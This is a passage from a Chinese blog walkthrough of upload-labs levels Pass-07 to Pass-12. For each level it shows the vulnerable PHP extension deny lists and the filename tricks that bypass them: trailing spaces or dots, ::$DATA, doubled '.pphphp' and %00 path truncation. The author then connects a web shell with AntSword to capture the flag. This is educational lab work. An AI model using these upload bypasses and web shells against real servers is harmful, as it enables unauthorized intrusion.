class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>继续查看源码，与前面几关的源码对比，很容易能看出这次少了另一行代码：</p><img src="https://bu.dusays.com/2022/05/09/6278b04e011d0.webp" alt="" style="zoom: 75%;"/><p>少的就是这行首尾去空的代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="突破限制-8">突破限制</h3><ul><li><p>要利用这行缺失代码所带来的漏洞，我们先要知道他是干什么的。</p><p>正如注释所言，<kbd>trim()</kbd> 函数的作用就是去除字符串两端的空白字符。头部的空白字符很难对我们产生影响，但是尾部就涉及到了后缀名的内容。当后缀名为 <kbd>.php[]</kbd> 时（ <kbd>[]</kbd> 表示空白字符），他显然是不能与黑名单中的任一后缀匹配上的，由于是空白字符，因此大小写屏蔽也无影响。也就是说，如果我们的文件后缀名为 <kbd>.php[]</kbd> 时，入侵将不受任何影响<psw>？</psw></p></li><li><p>当然，如果想直接上传尾部带空格的文件也是不可能的，因为操作系统会自动忽略首位空白字符，因此，这里需要抓包！</p></li><li><p>在 <kbd>Burp Suite</kbd> 中打开靶机，直接上传备好的木马文件，抓包并在上传的文件名末尾加上一个空格。</p><img src="https://bu.dusays.com/2022/05/09/6278b04e011d0.webp" alt="" style="zoom: 75%;" /></li><li><kbd>Forward</kbd> 之后就可以看到文件已经上传成功。<img src="https://bu.dusays.com/2022/05/09/6278b0507722c.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="夺旗-6">夺旗</h3><ul><li><p>蚁剑连接，然后出问题。</p><img src="https://bu.dusays.com/2022/05/09/6278b052176c1.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="问题探究-2">问题探究</h3><ul><li><p>然而无论怎么试，始终都无法成功连接，甚至直接通过浏览器访问文件，也显示 <kbd>NOT FOUND</kbd> 。通过其他关卡访问后台，可以发现我们上传的文件是存在的：</p><img src="https://bu.dusays.com/2022/05/09/6278b054cce14.webp" alt="" style="zoom: 75%;" /><p>并且打开之后的内容也没有变：</p><img src="https://bu.dusays.com/2022/05/09/6278b053a87b1.webp" alt="" style="zoom: 75%;" /></li><li><p>这里有个小细节，文件图标不一样，有效的脚本文件为第二个，而本关上传的文件为第一个，因此，我们所上传的这个文件并没有被解释为 <kbd>php</kbd> 脚本。</p><img src="https://bu.dusays.com/2022/05/09/6278b055a444e.webp" alt="" style="zoom: 75%;" /></li><li><p>可能出问题的地方只有空格，我们在 URL 后加上 <kbd>%20</kbd> （代表空格）并在浏览器中访问，可以访问，而且在浏览器中显示了文本。</p><img src="https://bu.dusays.com/2022/05/09/6278b0566bcbb.webp" alt="" style="zoom: 75%;" /></li><li><kbd>php</kbd> 指令在浏览器中不会显示，因此我们所上传的 <kbd>.php[]</kbd> 后缀的文件仅被解析为文本文件，而文本文件没有任何作用。</li><li><p>有一个前提被忽略了，后缀添加空格的漏洞<strong>仅适用于 Windows 系统</strong>。而靶机建立在 Linux 系统中，因此，这个漏洞在这不成立！由于 <a href="https://buuoj.cn/">BUUCTF</a> 提供了 Windows 版本的靶机，因此这里直接换用，之后的关卡也将尽量基于 Windows 版本。</p></li></ul><h3 id="再次夺旗">再次夺旗</h3><ul><li><p>换了系统版本并再次上传文件后，蚁剑连接！</p><img src="https://bu.dusays.com/2022/05/09/6278b05747bb9.webp" alt="" style="zoom: 75%;" /><p>这里需要注意的一点是，编码器不能使用 <kbd>default</kbd> 了，测试时貌似被 WAF 给抓了，因此这里使用 <kbd>base64</kbd> 。</p></li><li><p>根目录夺旗，有一说一 Windows 的根目录还是熟悉一点，<psw>非常乱！</psw>，但是这文件名~</p><img src="https://bu.dusays.com/2022/05/09/6278b058771e5.webp" alt="" style="zoom: 75%;" /></li></ul><h2 id="Pass-08">Pass-08</h2><h3 id="启动靶机-18">启动靶机</h3><ul><li><p>再次回到开始，熟悉的界面。</p><img src="https://bu.dusays.com/2022/05/09/6278b00ea80cf.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究界面-6">研究界面</h3><ul><li><p>直接看源码，依然是关键部分少了一句：</p><img src="https://bu.dusays.com/2022/05/11/627bd807c9465.webp" alt="" style="zoom: 75%;" /><p>删除了这句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure></li><li><p>该语句负责删除文件名末尾无效的点，也就是说，如果后缀名为 <kbd>.php.</kbd> 的话，将不会被黑名单命中，且由于 Windows 自动忽略末尾无效点，应脚本依然能够被正确执行！</p></li><li><p>值得注意的是由于后续语句都基于最后一个点所提取出来的后缀名做的操作，而该语句的删除也导致后缀名提取为空，即 <kbd>.php.</kbd> 中最后一个点后面所接的后缀名为空。因此，只要上传文件的文件名以点结尾，所有的后续操作都将无效。</p></li></ul><h3 id="突破限制-9">突破限制</h3><ul><li><p>在 <kbd>BurpSuite</kbd> 中打开靶机，上传文件抓包修改文件名，只需要在最后加上一个点即可：</p><img src="https://bu.dusays.com/2022/05/11/627bd80981451.webp" alt="" style="zoom: 75%;" /></li><li><kbd>Forward</kbd> 之后，上传成功！<img src="https://bu.dusays.com/2022/05/11/627bd7e2bced4.webp" alt="" style="zoom: 75%;"/></li></ul><h3 id="夺旗-7">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/11/627bd7ec1db5c.webp" alt="" style="zoom: 75%;" /><p>当然，末尾不要带点（就是因为 Windows 会把无效点舍去才会有这个漏洞），编码器也不要用默认的。</p></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/11/627bd7e2f2a82.webp" alt="" style="zoom: 75%;" /></li></ul><h2 id="Pass-09">Pass-09</h2><h3 id="启动靶机-19">启动靶机</h3><ul><li><p>继续继续，第九关了！</p><img src="https://bu.dusays.com/2022/05/11/627bd7e592a21.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究界面-7">研究界面</h3><ul><li><p>不多废话，直接看源码，根据前几关的经验，该轮到 <kbd>::&#36;DATA</kbd> 了。源码中果然少了那句。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><img src="https://bu.dusays.com/2022/05/11/627bd7ea4a317.webp" alt="" style="zoom: 75%;" /></li><li><p>关于 <kbd>::&#36;DATA</kbd> 的作用，在 Windows 系统中只会以 <kbd>::&#36;DATA</kbd> 前的数据当作文件名。因此，如果文件名为 <kbd>h-t-m.php::&#36;DATA</kbd> 则后缀名不会与黑名单匹配，但是系统也依然会正确执行！</p></li></ul><h3 id="突破限制-10">突破限制</h3><ul><li><p>在 <kbd>BurpSuite</kbd> 中打开靶机，上传文件抓包修改文件名，只需要在最后加上 <kbd>::&#36;DATA</kbd> 即可：</p><img src="https://bu.dusays.com/2022/05/11/627bd7ef7b929.webp" alt="" style="zoom: 75%;" /></li><li><kbd>Forward</kbd> 之后，上传成功！<img src="https://bu.dusays.com/2022/05/11/627bd7f1259bd.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="夺旗-8">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/11/627bd7f21daae.webp" alt="" style="zoom: 75%;" /><p>当然，<kbd>::&#36;DATA</kbd> 是要被忽略的，所以连接时不要加上 <kbd>::&#36;DATA</kbd> 。</p></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/11/627bd7f4d5172.webp" alt="" style="zoom: 75%;" /></li></ul><h2 id="Pass-10">Pass-10</h2><h3 id="启动靶机-20">启动靶机</h3><ul><li><p>再次回到这里</p><img src="https://bu.dusays.com/2022/05/09/6278b00ea80cf.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究页面-6">研究页面</h3><ul><li><p>直接查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码与前后的关卡中的源码都类似，甚至就是最全面的版本，因此，本关的解法也适用于前面几关。</p></li><li><p>再次统一分析一下这段关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>我们需要知道，文件名末尾的点与空格都是无效的，但是他们却会影响文件的匹配，比如后缀名 <kbd>.php</kbd> 与 <kbd>.php.</kbd> 就不匹配，但是 <kbd>.php.</kbd> 在 Windows 中执行时却因为自动忽略而变成 <kbd>.php</kbd>。因此，为避免空字符突破黑名单的漏洞，程序需要对接收到的文件名做处理，以让黑名单中的后缀名不管怎么伪装总能被匹配到。</p><p>第一句话就是负责删除文件名末尾的点，删除了末尾无效的点之后，文件名中最后一个点后面所接的就是后缀名了，因此：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br></pre></td></tr></table></figure><p>该语句就是获取后缀名，通过 <kbd>strtolower()</kbd> 方法将所有字母小写，这样就屏蔽了大小写漏洞。值得注意的是 <kbd>::&#36;DATA</kbd> ，在 Windows 中会将 <kbd>::&#36;DATA</kbd> 之后的数据当作文件流，而保持 <kbd>::&#36;DATA</kbd> 前的文件名，因此如果文件名为 <kbd>h-t-m.php::&#36;DATAmyr520</kbd> ，就会等价于 <kbd>h-t-m.php</kbd>。因此，第四句话的作用就是将他删去再进行匹配。最后一句话即如注释所示，删去空白字符。因为第一句话只是删除了点，而现在空白字符也删去了。那么，岂不是没有漏洞了？</p></li><li><p>显然不是，上述代码虽然看似完善，但实际上忽略了一个巨大的问题。第一句只能删除末尾的点，而不能删去空白字符，那么如果后缀是这种形式的：<kbd>.php.[].</kbd> （ <kbd>[]</kbd> 表示空白字符），那么第一句话将只能删去最后的那个点，在经过第四句后缀就变成了 <kbd>.php.</kbd>，也就是说还是会剩下一个点。而这就是我们要利用的漏洞，漏洞出现的原因就是没有循环验证。</p></li></ul><h3 id="突破限制-11">突破限制</h3><ul><li><p>需要备好的木马文件的后缀名修改为 <kbd>.php.[].</kbd>（ <kbd>[]</kbd> 表示空格），当然这无法再 Windows 下完成，因此我们需要抓包修改。</p></li><li><p>在 <kbd>BurpSuite</kbd> 中打开靶机并上传木马文件，在文件后缀名之后加上 <kbd>.[].</kbd> （ <kbd>[]</kbd> 表示空格）。</p><img src="https://bu.dusays.com/2022/05/09/6278b05cb6131.webp" alt="" style="zoom: 75%;" /></li><li><kbd>Forward</kbd> 之后文件上传成功！<img src="https://bu.dusays.com/2022/05/09/6278b00bda517.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="夺旗-9">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/09/6278b00c92ed0.webp" alt="" style="zoom: 75%;" /><p>如果上传之后直接获取文件 URL 可能后缀名后会带点，由于我们执行文件时点是被系统忽略的，因此蚁剑连接时记得末尾不要带点！</p></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/09/6278b00d7db69.webp" alt="" style="zoom: 75%;" /></li></ul><h2 id="Pass-11">Pass-11</h2><h3 id="启动靶机-21">启动靶机</h3><ul><li><p>上一关算是一个BOSS，这关总得不太一样吧，专题训练过半🎊</p><img src="https://bu.dusays.com/2022/05/11/627bd7fdc6ff6.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究界面-8">研究界面</h3><ul><li><p>直接查看源码，重点在这句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure><p>这句将文件名中与黑名单匹配的部分换为空，即使黑名单中的文件无法被解析。</p></li><li><p>但是，就这么一句一次只能替换当前存在的黑名单字符，我把后缀名换成 <kbd>.pphphp</kbd> 被替换后还剩下 <kbd>.php</kbd>，这不是正好。甚至可以吧后缀名改成 <kbd>.pphpphpphpphpphpphphp</kbd>，照样正好。</p></li></ul><h3 id="突破限制-12">突破限制</h3><ul><li><p>那就直接将木马文件后缀名改成 <kbd>.pphphp</kbd></p><img src="https://bu.dusays.com/2022/05/11/627bd7ff02968.webp" alt="" style="zoom: 75%;" /></li><li><p>上传，成功！</p><img src="https://bu.dusays.com/2022/05/11/627bd801860ac.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="夺旗-10">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/11/627bd802bc6c1.webp" alt="" style="zoom: 75%;" /></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/11/627bd804225c5.webp" alt="" style="zoom: 75%;" /></li></ul><h2 id="Pass-12">Pass-12</h2><h3 id="启动靶机-22">启动靶机</h3><ul><li><p>再次重新开始！</p><img src="https://bu.dusays.com/2022/05/12/627d002f435a7.webp" alt="" style="zoom: 75%;" /></li></ul><h3 id="研究页面-7">研究页面</h3><ul><li><p>先看一下提示：</p><img src="https://bu.dusays.com/2022/05/12/627d003178298.webp" alt="" style="zoom: 75%;" /><p>“上传路径可控”，挺好，就是不太懂怎么个可控法。</p></li><li><p>于是继续查看一下源码，代码不长，因此这里完整梳理一遍：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以看出，这次文件过滤不再采用黑名单，而是用白名单将可上传文件限制为 <kbd>.jpg</kbd>、<kbd>.png</kbd>、<kbd>.gif</kbd> 三种格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>紧接着老长的一句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br></pre></td></tr></table></figure><kbd>strrpos()</kbd> 返回第二个参数（<kbd>.</kbd>）在第一个参数中（文件名）最后一次出现的位置，<kbd>substr()</kbd> 则返回从第二个参数（索引）之后的字符串。 因此，这句语句其实就是截取文件的后缀名。<p>由于是白名单，后缀名截取结果只要不在白名单中均无效，因此，前面关卡中在后缀名后添加无效的点的小伎俩肯定是不能用了。</p></li><li><p>接下来这句其实就是用 <kbd>&#36;temp_file</kbd> 变量引用上传时生成的临时文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br></pre></td></tr></table></figure><p>文件的上传实际上就是将临时文件放入服务器指定位置，也就是后面在 <kbd>if</kbd> 语句中完成的操作，上传成功则返回 <kbd>true</kbd>，否则返回 <kbd>false</kbd>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)</span><br></pre></td></tr></table></figure></li><li><p>而在上述两个语句之间的这句则是本关的重点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><kbd>rand(10, 99)</kbd> 返回一个 <kbd>10</kbd> ~ <kbd>99</kbd> 之间的随机整数，<kbd>date(YmdHis)</kbd> 返回代表当前时间的一串整数，其中 <kbd>YmdHis</kbd> 分别表示年月日时分秒。后面又衔接上了点与后缀名，因此，<kbd>/</kbd> 之后表示以随机数加时间戳的形式重命名文件。上传一个图片测试一下：<img src="https://bu.dusays.com/2022/05/12/627d00323885f.webp" alt="" style="zoom: 75%;" /><img src="https://bu.dusays.com/2022/05/12/627d003a8f712.webp" alt="" style="zoom: 75%;" /><p>而代码中 <kbd>/</kbd> 之前的 <kbd>&#36;_GET[save_path]</kbd> 则表示指定的上传路径，默认上传路径依然是 <kbd>upload</kbd> 目录下。值得注意的是，<kbd>save_path</kbd> 由 <kbd>GET</kbd> 方式上传，因此，我们可以在 URL 中指定文件的上传路径，而提示中的“上传路径可控”指的自然就是这个了！</p></li></ul><h3 id="突破限制-13">突破限制</h3><ul><li><p>既然可以修改上传路径，那么这对我们又有什么用呢？</p><p>在 URL 中，我们并不能输入所有的字符，而当我们需要表示一个特殊字符时，便需要对他进行编码。在之前的关卡中，我们的木马文件都使用了中文字符作为文件名，但实际使用时却用的是他的编码形式，一般形式为百分号后加二位十六进制数（Ascii）表示一个字符，而一个中文字符需要使用三个一般字符来表示：</p><blockquote><p>http://[靶机地址]/upload/木马.php</p><p>http://[靶机地址]/upload/%E6%9C%A8%E9%A9%AC.php</p></blockquote><p>在浏览器中打开时你会发现显示的依然是中文字符，那是因为浏览器会自动帮助我们解码。</p><p>而在这些编码中，就有一个特殊字符 <kbd>%00</kbd>。在 C 语言的字符串中有一个 Ascii 值为零的特殊字符 <kbd>0</kbd>，一般用于表示字符串结束，而在这里，他也起相同作用。</p></li><li><p>依然注意这段关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p>当我们上传一个 <kbd>jpg</kbd> 文件，并且指定的路径 <kbd>save_path</kbd> 为 <kbd>../muma.php%00</kbd> ，连之后就会变成 <kbd>../muma.php%00/[随机数].jpg</kbd> . 而这段字符串在 <kbd>%00</kbd> 就已经被截断了，因此原本将文件上传至 <kbd>jpg</kbd> 文件的语句就变成的将文件上传至 <kbd>muma.php</kbd> 文件中，因此，我们就可以入侵了。</p></li><li><p>有趣的是，这个漏洞<strong>只有</strong>在 <kbd>magic_quotes_gpc</kbd> 函数<strong>关闭</strong>的条件下才能实现，而这个函数默认情况下是开启的，且在 <strong>PHP 5.3.4</strong> 版本之后漏洞也已经被修复了。我们在 Pass-05 时获取过 <kbd>phpinfo()</kbd> ，虽然版本号为 5.2.17 是不错，但是很遗憾靶机的 <kbd>magic_quotes_gpc</kbd> 函数依然保持开启状态：</p><img src="https://bu.dusays.com/2022/05/12/627d003cd2d19.webp" alt="" style="zoom: 75%;" /><img src="https://bu.dusays.com/2022/05/12/627d00b00bbf5.webp" alt="" style="zoom: 75%;" /><p>因此，虽然不太情愿，但本关依旧使用本地搭建的靶机。</p><p>不知道为什么我的 <kbd>PHP study</kbd> 一直无法下载 php 5.2.17 版本，因此我只能在 <a href="https://www.php.net/releases/index.php">php 发布页</a> 下载了 php 5.2.10 版本（眼瘸，看不到 5.2.17 